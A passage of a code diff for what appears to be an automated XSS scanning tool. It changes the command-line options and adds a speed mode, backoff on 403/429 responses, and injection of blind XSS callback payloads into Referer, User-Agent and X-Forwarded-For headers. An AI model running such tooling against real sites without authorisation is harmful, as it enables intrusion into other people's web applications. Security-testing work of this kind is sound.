+            except Exception:
+                pass
 
     elapsed = time.time() - start
     console.print()
@@ -1828,7 +2229,7 @@ Examples:
     p.add_argument("-u", "--url",         required=True,
                    help="Target URL (base URL or URL with params)")
     p.add_argument("-p", "--param",       default=None,
-                   help="Parameter to inject. Omit → Auto-Discovery mode")
+                   help="Parameter to inject. Omit -> Auto-Discovery mode")
 
     # Performance
     p.add_argument("-c", "--concurrency", type=int,   default=SEMAPHORE_LIMIT,
@@ -1840,16 +2241,24 @@ Examples:
                    help=f"Random delay range in seconds (default: {JITTER_MIN} {JITTER_MAX})")
     p.add_argument("--max-pages",         type=int,   default=MAX_CRAWL_PAGES,
                    help=f"Max pages to crawl in Auto-Discovery mode (default: {MAX_CRAWL_PAGES})")
+    p.add_argument("--fast",              action="store_true",
+                   help="Speed mode: near-zero jitter, dialog_timeout=1200ms, concurrency=40 "
+                        "(trades some delayed-dialog detection for raw speed)")
 
     # Network
     p.add_argument("--proxy",             default=None,
                    help="HTTP proxy URL e.g. http://127.0.0.1:8080 (Burp Suite)")
     p.add_argument("--cookie",            default=None,
                    help='Session cookies e.g. "session=abc123; token=xyz"')
+    p.add_argument("--retry-delay",       type=int,   default=RATE_LIMIT_DELAY,
+                   help=f"Backoff delay in seconds on 403/429 responses (default: {RATE_LIMIT_DELAY})")
 
     # Features
     p.add_argument("--xss-report",        default=None, metavar="ID",
                    help="xss.report callback ID for Blind XSS / OOB detection")
+    p.add_argument("--oob-context",       action="store_true",
+                   help="Also inject Blind XSS/OOB payloads into Referer, User-Agent, "
+                        "and X-Forwarded-For headers (requires --xss-report)")
     p.add_argument("--screenshot",        action="store_true",
                    help="Save full-page screenshot on each confirmed XSS")
     p.add_argument("--show-browser",      action="store_true",
